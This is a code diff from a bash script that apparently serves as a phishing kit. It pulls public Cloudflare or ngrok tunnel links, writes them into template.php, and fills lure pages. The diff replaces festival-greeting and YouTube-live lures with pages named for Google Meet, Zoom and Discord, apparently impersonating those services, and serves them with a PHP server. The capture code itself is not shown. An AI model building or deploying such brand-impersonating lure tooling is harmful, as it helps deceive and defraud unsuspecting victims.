@@ -452,13 +452,11 @@ payload_cloudflare() {
 link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
-sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+sed 's+forwarding_link+'$link'+g' googlemeet.html > index3.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+sed 's+forwarding_link+'$link'+g' zoom.html > index3.html
 else
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+sed 's+forwarding_link+'$link'+g' discord.html > index2.html
 fi
 rm -rf index3.html
 }
@@ -608,13 +606,11 @@ payload_ngrok() {
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
-sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+sed 's+forwarding_link+'$link'+g' googlemeet.html > index3.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+sed 's+forwarding_link+'$link'+g' zoom.html > index3.html
 else
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+sed 's+forwarding_link+'$link'+g' discord.html > index2.html
 fi
 rm -rf index3.html
 }
@@ -667,7 +663,7 @@ tunnel_menu() {
   printf "${CYAN} 02. Ngrok.io\n"
   printf "${CYAN} 03. Cloudflared\n\n"
 
-  read -p "${MAGENTA} Select a port forwarding service or return to main menu:\n"
+  read -p "${MAGENTA} Select a port forwarding service or return to main menu:"
 
   case $REPLY in
     0 | 00)
@@ -675,7 +671,7 @@ tunnel_menu() {
       { sleep 1; main_menu; };;
     1 | 01)
       # Localhost option: Directly run PHP server
-      printf "${GREEN}${BOLD}[${WHITE}>${GREEN}${BOLD}] Starting PHP server on %s:%s...\n" "$HOST" "$PORT"
+      printf "\n${GREEN}${BOLD}[${WHITE}>${GREEN}${BOLD}] Starting PHP server on %s:%s...\n" "$HOST" "$PORT"
       php -S "$HOST:$PORT" > /dev/null 2>&1 &
       sleep 5  # Give the server some time to start
       echo -e "${GREEN}${BOLD}[${WHITE}+${GREEN}${BOLD}] Web server running. Open your browser to http://$HOST:$PORT\e[0m"
